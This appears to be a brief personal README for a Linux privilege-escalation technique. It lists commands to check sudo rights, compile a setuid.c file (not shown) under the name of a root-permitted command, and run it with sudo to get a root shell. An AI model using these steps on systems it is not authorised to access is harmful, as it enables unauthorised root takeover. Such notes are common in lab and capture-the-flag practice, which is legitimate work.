# SetUID
My personal guide to get privesc

# How to Use 
Run ```sudo -l``` <br/>
Read which commands can be executed by root (for example ```test/nameFile```) <br/>
Run ```mkdir test``` <br/>
Move **setuid.c** in **test** <br/>
```mv setuid.c test``` <br/>
Compile script <br/>
```gcc setuid.c -o nameFile``` <br/>
Run as root <br/>
```sudo -u root nameFile``` <br/>
Get Shell <br/>
